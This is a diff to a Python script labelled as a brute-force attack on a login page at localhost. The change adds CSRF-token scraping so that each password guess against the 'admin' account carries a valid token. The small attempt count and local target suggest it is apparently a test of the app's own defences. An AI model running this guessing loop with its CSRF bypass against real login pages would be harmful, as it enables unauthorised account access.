@@ -12,10 +12,20 @@ Expected outcome:
 
 import requests
 import time
+import re
 
 TARGET_URL = "http://127.0.0.1:5000/login"
 TARGET_USER = "admin"
 ATTEMPTS = 8
+CSRF_RE = re.compile(r'name="csrf_token" value="([^"]+)"')
+
+
+def get_csrf_token(session):
+    response = session.get(TARGET_URL, timeout=5)
+    match = CSRF_RE.search(response.text)
+    if not match:
+        raise RuntimeError(f"CSRF token not found (HTTP {response.status_code})")
+    return match.group(1)
 
 print("=" * 50)
 print(f"🔨 Initiating Brute Force Attack on {TARGET_URL}")
@@ -32,7 +42,8 @@ for i in range(1, ATTEMPTS + 1):
     
     payload = {
         "username": TARGET_USER,
-        "password": password_guess
+        "password": password_guess,
+        "csrf_token": get_csrf_token(session)
     }
     
     print(f"[{i}/{ATTEMPTS}] Trying password: '{password_guess}' ... ", end="", flush=True)
